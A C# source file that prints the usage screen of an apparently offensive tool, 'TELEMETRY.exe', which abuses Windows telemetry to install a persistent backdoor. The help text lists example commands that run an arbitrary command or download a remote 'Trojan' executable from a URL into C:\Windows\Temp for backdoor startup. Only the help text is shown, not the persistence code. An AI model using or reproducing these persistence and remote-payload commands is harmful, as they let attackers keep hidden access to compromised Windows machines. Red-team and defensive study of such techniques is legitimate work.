using System;

namespace TELEMETRY.Domain
{
    public static class Info
    {
        public static void ShowUsage()
        {
            string usage = @"

    ABUSING WINDOWS TELEMETRY FOR PERSISTENCE  
                                             .Imanfeng


    Features:
        Install:   -   Deployment authority maintains backdoor

    Command :
        TELEMETRY.exe install /command:calc   
        -   Execute command without file backdoor

        TELEMETRY.exe install /url:http://8.8.8.8/xxx.exe /path:C:\Windows\Temp\check.exe   
        -   Remotely download Trojan files to the specified directory for backdoor startup

        TELEMETRY.exe install /url:http://8.8.8.8/xxx.exe  
        -   Remotely download Trojan files to C:\\Windows\\Temp\\compattelrun.exe for backdoor startup

        TELEMETRY.exe install /path:C:\Windows\Temp\check.exe   
        -   Set path Trojan files for backdoor startup

    Parameter:
        /command: -   Execute Command
        /url:     -   Download FROM
        /path:    -   Download To
";
            Console.WriteLine(usage);
        }
    }
}
